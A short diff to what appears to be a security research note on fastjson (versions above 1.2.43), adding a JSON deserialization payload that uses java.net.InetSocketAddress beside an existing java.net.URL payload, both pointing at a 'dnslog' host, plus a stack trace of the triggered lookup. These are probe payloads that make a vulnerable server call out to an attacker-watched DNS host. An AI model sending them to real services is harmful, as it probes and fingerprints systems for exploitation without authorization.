@@ -53,6 +53,8 @@ fastjson >1.2.43
 ```java
 {{"@type":"java.net.URL","val":"http://dnslog"}:"x"}
 
+{"x":{"@type":"java.net.InetSocketAddress"{"address":,"val":"dnslog"}}}
+
 hashCode:359, URLStreamHandler (java.net)
 hashCode:885, URL (java.net)
 hash:339, HashMap (java.util)
